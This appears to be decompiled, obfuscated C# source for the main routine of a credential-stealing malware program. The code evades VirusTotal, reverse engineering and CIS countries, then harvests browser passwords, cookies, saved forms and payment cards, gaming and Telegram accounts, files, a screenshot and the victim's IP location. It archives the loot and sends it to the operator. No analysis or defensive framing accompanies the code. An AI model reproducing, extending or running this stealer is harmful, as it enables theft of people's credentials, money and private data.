using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using Application.Anti.Reverse;
using Application.Anti.VT;
using Application.Defender.Reverse.Methods;
using Application.Grabber.Applications;
using Application.Grabber.Browsers;
using Application.Grabber.Other;

namespace Application
{
	// Token: 0x02000006 RID: 6
	internal class Program
	{
		// Token: 0x0600003D RID: 61 RVA: 0x000028B4 File Offset: 0x00000AB4
		[MethodImpl(MethodImplOptions.NoInlining)]
		private static void Main()
		{
			Program.c000007 c = new Program.c000007();
			string text = delegate0d0.f0000ba(delegate0ce.f0000b6(AES.GetKey(delegate0cd.f0000a3(delegate0cc.f0000a1()).Replace(c0000c0.m00000f("¿d5\u0001"), c0000c0.m00000f("")))), delegate0cf.f0000b7().DayOfYear.ToString());
			string text2 = delegate0ca.f00009d(Environment.SpecialFolder.UserProfile);
			foreach (string text3 in Settings.AntiRepeatDirectories)
			{
				if (delegate0d2.f0000be(delegate0d1.f0000bd(new string[]
				{
					text2,
					c0000c0.m00000f("Í"),
					text3,
					c0000c0.m00000f("Í"),
					text
				})))
				{
					delegate0d3.f0000c4(null);
				}
			}
			if (Settings.AntiVT)
			{
				Application.Anti.VT.Core.Execute();
			}
			if (Settings.AntiReverse)
			{
				Application.Anti.Reverse.Core.Execute();
			}
			ServicePointManager.SecurityProtocol = (SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12);
			c.results = new List<FileObject>();
			Thread[] array = new Thread[]
			{
				new Thread(new ThreadStart(c.m000001)),
				new Thread(new ThreadStart(c.m000002)),
				new Thread(new ThreadStart(c.m000003))
			};
			Thread[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				delegate0c9.f000094(array2[i]);
			}
			array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				delegate0c9.f000095(array2[i]);
			}
			Program.NormalizeResults(Program.NormalizeResults(c.results));
			int passwords = Chromium_Edited.Passwords;
			int num = Chromium_Edited.Cookies + Firefox_Edited.Cookies;
			int forms = Chromium_Edited.Forms;
			int cards = Chromium_Edited.Cards;
			if (passwords < 0 && num < 0 && forms < 0 && cards < 0)
			{
				delegate0d3.f0000c4(null);
			}
			bool flag = Telegram.Count > 0;
			bool flag2 = EpicGames.Count > 0;
			bool flag3 = GOG.Count > 0;
			bool flag4 = Origin.Count > 0;
			bool flag5 = Steam.Count > 0;
			bool flag6 = Telegram.Count > 0;
			bool flag7 = uTorrent.Count > 0;
			bool flag8 = VimeWorld.Count > 0;
			int count = Files.Count;
			System.Screenshot();
			c.geo = System.Geo();
			if (Settings.AntiCis && Settings.CisCountries.Where(new Func<string, bool>(c.m000004)).Count<string>() > 0)
			{
				delegate0d3.f0000c4(null);
			}
			string text4 = System.UserName();
			bool flag9 = flag || flag2 || flag3 || flag4 || flag5 || flag6 || flag8;
			bool flag10 = passwords > 0 && num > 500;
			string text5 = delegate0d4.f0000c6(Settings.InformationFormat, new object[]
			{
				c.geo.Ip,
				c.geo.Country,
				text4,
				passwords,
				num,
				forms,
				cards,
				count,
				flag,
				flag2,
				flag3,
				flag4,
				flag5,
				flag6,
				flag7,
				flag8,
				flag9,
				flag10,
				Settings.InformationDescription
			});
			text5 = delegate0d4.f0000c6(c0000c0.m00000f("·h=YÝYN\u0011Ï\u001d;B|å4Zí³\u0013@X·\u007fß=ß\u001a»*ÃÑË;G+\u001fëúO\u0082Z\u001eõî¨D\u0084V\u009b\u0097r¾¥F+·Ñã6\u0081\u009f!M\u0081³í;­j\u0083¬z\u0006\u000f\u0015ÄÍþ7|r-\u008cn¢wÃ\u009a\a\u001fà\u008c\u0015Rs\u008d-é|=Wö\u008ddBòf,\tÃ\u001a\u000eL\u0095\u000fhKgðp\u001c§²\u0013@B¶sÊ:ÐJ¥&\u0089\u009e\u0090nC/\rõ°[Á\f\u0010îáþUÇR\u0086\u0099tê»\u0004%±Ãëd\u0088\u0082!E\u009cú«uáx\u009dë~\v\u0011MÈ\u0094ñ}~&:Ø(â*\u0093\u0086L\u0018¸\u0083L\u0001}Ï>½dm\u0017«Ù#V·e(\u0017Å\u001bZGØ\u001b!B5ì|_ë"), new object[]
			{
				c.geo.Ip,
				c.geo.Country,
				text4,
				passwords,
				num,
				forms,
				cards,
				count,
				flag,
				flag2,
				flag3,
				flag4,
				flag5,
				flag6,
				flag7,
				flag8,
				flag9,
				flag10,
				Settings.InformationDescription
			});
			string fileName = delegate0d5.f0000c8(Settings.ZipNameFormat, c.geo.Country, c.geo.Ip);
			c.results.Add(new FileObject(c0000c0.m00000f("Øo+\vÔ\u0004RCÅ\u001d \u0002|ï9"), delegate0d7.f0000d1(delegate0d6.f0000ca(), text5)));
			c.results.Add(new FileObject(c0000c0.m00000f("Õd9\u0005Ï\u0005VSå\u001c(Czú,\u0013ÿí\0HY¼n"), System.Other()));
			c.results.Add(new FileObject(c0000c0.m00000f("Âb?\u0001Ã\a@_Ã\u0006`Fxò*"), System.Screenshot()));
			int num2 = 0;
			if (num2 < Settings.AttemptsSend)
			{
				Sender.Execute(Archive.Create(c.results), fileName, text5);
			}
			string text6 = Settings.AntiRepeatDirectories[delegate0d8.f0000d4(new Random(), 0, Settings.AntiRepeatDirectories.Length - 1)];
			delegate0d9.f0000d5(delegate0d1.f0000bd(new string[]
			{
				text2,
				c0000c0.m00000f("Í"),
				text6,
				c0000c0.m00000f("Í"),
				text
			}));
			delegate0d3.f0000c4(null);
		}

		// Token: 0x0600003E RID: 62 RVA: 0x00002EA8 File Offset: 0x000010A8
		[MethodImpl(MethodImplOptions.NoInlining)]
		private static List<FileObject> NormalizeResults(List<FileObject> results)
		{
			for (;;)
			{
				int num = delegate0da.f0000d7(-3);
				for (;;)
				{
					Program.c000009 c;
					Program.c00000a c00000a;
					int num2;
					int num3;
					List<FileObject> list3;
					int num4;
					switch (num)
					{
					case 0:
					{
						int i;
						List<FileObject> list;
						while (i < list.Count)
						{
							results.Remove(list[i]);
							i++;
						}
						goto IL_1B8;
					}
					case 1:
					{
						List<byte> list2 = c.fileObject.Content.ToList<byte>();
						list2.AddRange(c00000a.file2.Content.ToList<byte>());
						c.fileObject.Content = list2.ToArray();
						results.Remove(c00000a.file2);
						num2++;
						goto IL_243;
					}
					case 2:
						c.fileObject = results[num3];
						if (c.fileObject.Name.StartsWith(c0000c0.m00000f("Ós\"\u0013Õ\fAD")) || c.fileObject.Name.StartsWith(c0000c0.m00000f("×h!\u0001Õ")))
						{
							list3 = results.FindAll(new Predicate<FileObject>(c.m000006));
							num2 = 1;
							goto IL_243;
						}
						goto IL_253;
					case 3:
						results.RemoveAll(new Predicate<FileObject>(Program.c00000b.f000018.m000008));
						num4 = 0;
						goto IL_1BC;
					}
					break;
					IL_243:
					if (num2 >= list3.Count)
					{
						goto IL_253;
					}
					c00000a = new Program.c00000a();
					c00000a.file2 = list3[num2];
					results.FindAll(new Predicate<FileObject>(c00000a.m000007));
					num = delegate0da.f0000d7(-1);
					continue;
					IL_1BC:
					if (num4 >= results.Count)
					{
						num3 = 0;
						goto IL_259;
					}
					Program.c000008 c2 = new Program.c000008();
					c2.fileObject = results[num4];
					if (c2.fileObject.Name.StartsWith(c0000c0.m00000f("Ós\"\u0013Õ\fAD")) || c2.fileObject.Name.StartsWith(c0000c0.m00000f("×h!\u0001Õ")))
					{
						List<FileObject> list = results.FindAll(new Predicate<FileObject>(c2.m000005));
						int i = 1;
						num = delegate0da.f0000d7(0);
						continue;
					}
					IL_1B8:
					num4++;
					goto IL_1BC;
					IL_259:
					if (num3 >= results.Count)
					{
						return results;
					}
					c = new Program.c000009();
					num = delegate0da.f0000d7(-2);
					continue;
					IL_253:
					num3++;
					goto IL_259;
				}
			}
			return results;
		}

		// Token: 0x0600003F RID: 63 RVA: 0x00003120 File Offset: 0x00001320
		[MethodImpl(MethodImplOptions.NoInlining)]
		public Program()
		{
		}

		// Token: 0x06000040 RID: 64 RVA: 0x00003128 File Offset: 0x00001328
		// Note: this type is marked as 'beforefieldinit'.
		[MethodImpl(MethodImplOptions.NoInlining)]
		static Program()
		{
			c0000c0.Initialize();
			c0000c0.PostInitialize();
		}

		// Token: 0x02000007 RID: 7
		[CompilerGenerated]
		private sealed class c000007
		{
			// Token: 0x06000041 RID: 65 RVA: 0x00003134 File Offset: 0x00001334
			[MethodImpl(MethodImplOptions.NoInlining)]
			public c000007()
			{
			}

			// Token: 0x06000042 RID: 66 RVA: 0x0000313C File Offset: 0x0000133C
			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void m000001()
			{
				this.results.AddRange(Application.Grabber.Browsers.Core.Execute());
			}

			// Token: 0x06000043 RID: 67 RVA: 0x0000315C File Offset: 0x0000135C
			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void m000002()
			{
				this.results.AddRange(Application.Grabber.Applications.Core.Execute());
			}

			// Token: 0x06000044 RID: 68 RVA: 0x0000317C File Offset: 0x0000137C
			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void m000003()
			{
				this.results.AddRange(Files.Execute());
			}

			// Token: 0x06000045 RID: 69 RVA: 0x0000319C File Offset: 0x0000139C
			[MethodImpl(MethodImplOptions.NoInlining)]
			internal bool m000004(string item)
			{
				return delegate0db.f0000d8(item, this.geo.Country);
			}

			// Token: 0x06000046 RID: 70 RVA: 0x000031C0 File Offset: 0x000013C0
			// Note: this type is marked as 'beforefieldinit'.
			[MethodImpl(MethodImplOptions.NoInlining)]
			static c000007()
			{
				c0000c0.Initialize();
				c0000c0.PostInitialize();
			}

			// Token: 0x04000018 RID: 24
			public List<FileObject> results;

			// Token: 0x04000019 RID: 25
			public Geo geo;
		}

		// Token: 0x02000008 RID: 8
		[CompilerGenerated]
		private sealed class c000008
		{
			// Token: 0x06000047 RID: 71 RVA: 0x000031CC File Offset: 0x000013CC
			[MethodImpl(MethodImplOptions.NoInlining)]
			public c000008()
			{
			}

			// Token: 0x06000048 RID: 72 RVA: 0x000031D4 File Offset: 0x000013D4
			[MethodImpl(MethodImplOptions.NoInlining)]
			internal bool m000005(FileObject item)
			{
				return item.Content.SequenceEqual(this.fileObject.Content);
			}

			// Token: 0x06000049 RID: 73 RVA: 0x000031F8 File Offset: 0x000013F8
			// Note: this type is marked as 'beforefieldinit'.
			[MethodImpl(MethodImplOptions.NoInlining)]
			static c000008()
			{
				c0000c0.Initialize();
				c0000c0.PostInitialize();
			}

			// Token: 0x0400001A RID: 26
			public FileObject fileObject;
		}

		// Token: 0x02000009 RID: 9
		[CompilerGenerated]
		private sealed class c000009
		{
			// Token: 0x0600004A RID: 74 RVA: 0x00003204 File Offset: 0x00001404
			[MethodImpl(MethodImplOptions.NoInlining)]
			public c000009()
			{
			}

			// Token: 0x0600004B RID: 75 RVA: 0x0000320C File Offset: 0x0000140C
			[MethodImpl(MethodImplOptions.NoInlining)]
			internal bool m000006(FileObject item)
			{
				return delegate0db.f0000d8(item.Name, this.fileObject.Name);
			}

			// Token: 0x0600004C RID: 76 RVA: 0x00003234 File Offset: 0x00001434
			// Note: this type is marked as 'beforefieldinit'.
			[MethodImpl(MethodImplOptions.NoInlining)]
			static c000009()
			{
				c0000c0.Initialize();
				c0000c0.PostInitialize();
			}

			// Token: 0x0400001B RID: 27
			public FileObject fileObject;
		}

		// Token: 0x0200000A RID: 10
		[CompilerGenerated]
		private sealed class c00000a
		{
			// Token: 0x0600004D RID: 77 RVA: 0x00003240 File Offset: 0x00001440
			[MethodImpl(MethodImplOptions.NoInlining)]
			public c00000a()
			{
			}

			// Token: 0x0600004E RID: 78 RVA: 0x00003248 File Offset: 0x00001448
			[MethodImpl(MethodImplOptions.NoInlining)]
			internal bool m000007(FileObject item)
			{
				return item == this.file2;
			}

			// Token: 0x0600004F RID: 79 RVA: 0x00003260 File Offset: 0x00001460
			// Note: this type is marked as 'beforefieldinit'.
			[MethodImpl(MethodImplOptions.NoInlining)]
			static c00000a()
			{
				c0000c0.Initialize();
				c0000c0.PostInitialize();
			}

			// Token: 0x0400001C RID: 28
			public FileObject file2;
		}

		// Token: 0x0200000B RID: 11
		[CompilerGenerated]
		[Serializable]
		private sealed class c00000b
		{
			// Token: 0x06000050 RID: 80 RVA: 0x0000326C File Offset: 0x0000146C
			// Note: this type is marked as 'beforefieldinit'.
			static c00000b()
			{
				c0000c0.Initialize();
				c0000c0.PostInitialize();
				Program.c00000b.f000018 = new Program.c00000b();
			}

			// Token: 0x06000051 RID: 81 RVA: 0x00003284 File Offset: 0x00001484
			[MethodImpl(MethodImplOptions.NoInlining)]
			public c00000b()
			{
			}

			// Token: 0x06000052 RID: 82 RVA: 0x0000328C File Offset: 0x0000148C
			[MethodImpl(MethodImplOptions.NoInlining)]
			internal bool m000008(FileObject item)
			{
				for (;;)
				{
					int num = delegate0da.f0000d7(-3);
					for (;;)
					{
						switch (num)
						{
						case 0:
							if (item.Name != null)
							{
								num = delegate0da.f0000d7(-2);
								continue;
							}
							return true;
						case 1:
							goto IL_A2;
						case 2:
							if (item.Name.Length >= 1)
							{
								num = delegate0da.f0000d7(-1);
								continue;
							}
							return true;
						case 3:
							if (item != null)
							{
								num = delegate0da.f0000d7(0);
								continue;
							}
							return true;
						}
						break;
					}
				}
				IL_A2:
				if (item.Content != null)
				{
					return item.Content.Length < 1;
				}
				return true;
			}

			// Token: 0x0400001D RID: 29
			public static readonly Program.c00000b f000018;

			// Token: 0x0400001E RID: 30
			public static Predicate<FileObject> f000019;
		}
	}
}
